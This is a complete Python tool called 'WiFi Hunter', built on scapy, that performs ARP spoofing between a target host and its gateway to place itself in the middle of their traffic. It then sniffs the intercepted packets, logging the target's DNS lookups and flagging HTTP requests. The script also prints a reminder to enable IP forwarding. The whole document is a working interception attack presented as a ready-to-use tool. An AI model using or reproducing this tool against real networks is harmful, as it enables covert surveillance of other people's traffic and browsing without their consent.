#!/usr/bin/env python3
"""
WiFi Hunter - Advanced Network Tools
ARP Spoofing + DNS Sniffer
"""

import scapy.all as scapy
import argparse
import sys
import signal
from colorama import Fore, Back, Style, init
from datetime import datetime
import threading
import time

init(autoreset=True)

class NetworkTools:
    def __init__(self):
        self.target_ip = None
        self.gateway_ip = None
        self.verbose = False
        self.running = False
        self.interface = None
        self.packets_count = 0
        self.dns_queries = {}
        # Added variables to manually save MAC if needed
        self.target_mac_override = None
        self.gateway_mac_override = None
        # Cache for MAC addresses to avoid rescanning
        self.resolved_macs = {}
        
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════╗
║           WiFi Hunter - Advanced Network Tools     ║
║             ARP Spoofing + DNS Sniffer v1.0        ║
╚════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def get_mac(self, ip, timeout=3, retries=3):
        """Gets MAC Address from IP with skip capability"""
        if ip in self.resolved_macs:
            return self.resolved_macs[ip]
            
        if ip == self.target_ip and self.target_mac_override:
            self.resolved_macs[ip] = self.target_mac_override
            return self.target_mac_override
        if ip == self.gateway_ip and self.gateway_mac_override:
            self.resolved_macs[ip] = self.gateway_mac_override
            return self.gateway_mac_override

        # Determine interface used for lookup
        active_iface = self.interface if self.interface else scapy.conf.iface

        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            answered_list = scapy.srp(arp_request_broadcast, timeout=timeout, retry=retries, verbose=False, iface=active_iface)[0]
            
            if answered_list:
                mac = answered_list[0][1].hwsrc
                self.resolved_macs[ip] = mac
                return mac
            return None
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] Error getting MAC: {str(e)}{Style.RESET_ALL}")
            return None
    
    def spoof_arp(self, target_ip, target_mac, spoof_ip):
        """Sends an ARP packet"""
        try:
            if not target_mac:
                if self.verbose:
                    print(f"{Fore.RED}[-] Could not get MAC for {target_ip}{Style.RESET_ALL}")
                return False
            
            arp_response = scapy.ARP(
                op="is-at",
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoof_ip
            )
            
            scapy.send(arp_response, verbose=False)
            return True
        except Exception as e:
            print(f"{Fore.RED}[-] ARP Error: {str(e)}{Style.RESET_ALL}")
            return False
    
    def restore_arp(self, target_ip, gateway_ip):
        """Restores ARP tables"""
        try:
            # Attempt to use cached MAC first for faster response on exit
            target_mac = self.resolved_macs.get(target_ip) or self.get_mac(target_ip)
            gateway_mac = self.resolved_macs.get(gateway_ip) or self.get_mac(gateway_ip)
            
            if target_mac and gateway_mac:
                arp_restore = scapy.ARP(
                    op="is-at",
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip,
                    hwsrc=gateway_mac
                )
                
                scapy.send(arp_restore, verbose=False, count=5)
                return True
            return False
        except Exception as e:
            print(f"{Fore.RED}[-] ARP Restore Error: {str(e)}{Style.RESET_ALL}")
            return False
    
    def packet_callback(self, packet):
        """Processes intercepted packets"""
        self.packets_count += 1
        
        if packet.haslayer(scapy.DNSQR) and packet.haslayer(scapy.IP):
            # Use errors='ignore' to avoid decoding errors for non-standard characters
            dns_query = packet[scapy.DNSQR].qname.decode(errors='ignore').rstrip('.')
            src_ip = packet[scapy.IP].src
            
            if dns_query not in self.dns_queries:
                self.dns_queries[dns_query] = 0
            self.dns_queries[dns_query] += 1
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            print(f"{Fore.GREEN}[{timestamp}]{Style.RESET_ALL} "
                  f"{Fore.YELLOW}DNS Query{Style.RESET_ALL}")
            print(f"  Source IP: {Fore.CYAN}{src_ip}{Style.RESET_ALL}")
            print(f"  Domain: {Fore.MAGENTA}{dns_query}{Style.RESET_ALL}")
            print()
        
        if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.IP):
            load = bytes(packet[scapy.Raw].load)
            if b"GET" in load or b"POST" in load:
                src_ip = packet[scapy.IP].src
                if self.verbose:
                    print(f"{Fore.RED}[*] HTTP Traffic from {src_ip}{Style.RESET_ALL}")
    
    def start_sniffer(self, interface=None):
        """Starts network monitoring"""
        print(f"\n{Fore.CYAN}[*] Starting packet sniffer...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Monitoring DNS and HTTP traffic...{Style.RESET_ALL}\n")
        
        try:
            # Added filter to avoid capturing tool's ARP packets and reduce load
            scapy.sniff(iface=interface, prn=self.packet_callback, filter="ip or port 53", store=False)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Sniffer Error: {str(e)}{Style.RESET_ALL}")
    
    def arp_spoof_thread(self):
        """Separate thread for ARP spoofing"""
        print(f"{Fore.CYAN}[*] Starting tool loop...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Target: {self.target_ip}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Gateway: {self.gateway_ip}{Style.RESET_ALL}\n")
        
        packets_sent = 0
        
        target_mac = self.get_mac(self.target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)
        
        if not target_mac or not gateway_mac:
            print(f"{Fore.RED}[-] Critical Error: Required MAC addresses not found. Loop aborted.{Style.RESET_ALL}")
            self.running = False
            return

        try:
            while self.running:
                self.spoof_arp(self.target_ip, target_mac, self.gateway_ip)
                self.spoof_arp(self.gateway_ip, gateway_mac, self.target_ip)
                
                packets_sent += 2
                
                if self.verbose and packets_sent % 20 == 0:
                    print(f"{Fore.GREEN}[+] Packets processed: {packets_sent}{Style.RESET_ALL}")
                
                time.sleep(1)
        
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Loop Error: {str(e)}{Style.RESET_ALL}")
        finally:
            print(f"\n{Fore.YELLOW}[*] Cleaning up and restoring network state...{Style.RESET_ALL}")
            for i in range(5):
                self.restore_arp(self.target_ip, self.gateway_ip)
            print(f"{Fore.GREEN}[+] Network state restored{Style.RESET_ALL}")
    
    def print_statistics(self):
        """Prints statistics"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}STATISTICS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Total Packets Captured: {Fore.GREEN}{self.packets_count}{Style.RESET_ALL}")
        
        if self.dns_queries:
            print(f"\n{Fore.YELLOW}Top DNS Queries:{Style.RESET_ALL}")
            sorted_queries = sorted(self.dns_queries.items(), key=lambda x: x[1], reverse=True)
            for idx, (domain, count) in enumerate(sorted_queries[:10], 1):
                print(f"  {idx}. {Fore.MAGENTA}{domain}{Style.RESET_ALL} ({count} queries)")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    def run(self, target, gateway, mode="full", verbose=False, t_mac=None, g_mac=None, interface=None):
        """Runs the tool"""
        self.target_ip = target
        self.gateway_ip = gateway
        self.verbose = verbose
        self.running = True
        self.interface = interface
        self.target_mac_override = t_mac
        self.gateway_mac_override = g_mac
        
        # Attempt auto-detection of interface if not specified
        if not self.interface:
            self.interface = scapy.conf.iface

        self.print_banner()
        
        print(f"{Fore.CYAN}[*] Configuration:{Style.RESET_ALL}")
        print(f"  Target IP: {Fore.YELLOW}{target}{Style.RESET_ALL}")
        if sys.platform == "win32":
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                print(f"{Fore.RED}[!] WARNING: Script is NOT running as Administrator. ARP Spoofing will likely fail.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Tip: Make sure IP Routing is enabled (IPEnableRouter=1 in Registry){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Reminder: Run 'echo 1 > /proc/sys/net/ipv4/ip_forward' to enable routing{Style.RESET_ALL}")
            
        print(f"  Gateway IP: {Fore.YELLOW}{gateway}{Style.RESET_ALL}")
        print(f"  Interface: {Fore.YELLOW}{self.interface}{Style.RESET_ALL}")
        print(f"  Mode: {Fore.YELLOW}{mode}{Style.RESET_ALL}")
        print()
        
        print(f"{Fore.CYAN}[*] Verifying connectivity...{Style.RESET_ALL}")
        
        target_mac = self.get_mac(target)
        gateway_mac = self.get_mac(gateway)
        
        if not target_mac or not gateway_mac:
            print(f"{Fore.RED}[-] Error: Target or Gateway unreachable.{Style.RESET_ALL}")
            if not self.target_mac_override:
                print(f"{Fore.YELLOW}[!] Please check connection or provide MAC manually using --target-mac{Style.RESET_ALL}")
                return False
            target_mac = self.target_mac_override
            gateway_mac = self.gateway_mac_override
        else:
            print(f"{Fore.GREEN}[+] Target MAC: {target_mac}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Gateway MAC: {gateway_mac}{Style.RESET_ALL}\n")
        
        if mode == "spoof":
            self.arp_spoof_thread()
        
        elif mode == "sniff":
            self.start_sniffer(self.interface)
        
        elif mode == "full":
            spoof_thread = threading.Thread(target=self.arp_spoof_thread, daemon=True)
            spoof_thread.start()
            time.sleep(2)
            self.start_sniffer(self.interface)
        
        return True

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Network Tools - ARP Spoofing + DNS Sniffer",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-m", "--mode", choices=["full", "spoof", "sniff"], default="full")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    
    # إضافة برامترات اختيارية لتمرير الماك يدويًا لتخطي الفحص بالكامل
    parser.add_argument("--target-mac", help="Force Target MAC address (Optional)")
    parser.add_argument("--gateway-mac", help="Force Gateway MAC address (Optional)")
    
    args = parser.parse_args()
    tools = NetworkTools()
    
    try:
        if tools.run(args.target, args.gateway, args.mode, args.verbose, args.target_mac, args.gateway_mac, args.interface):
            tools.print_statistics()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Interrupted by user{Style.RESET_ALL}")
        tools.running = False
        tools.print_statistics()
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()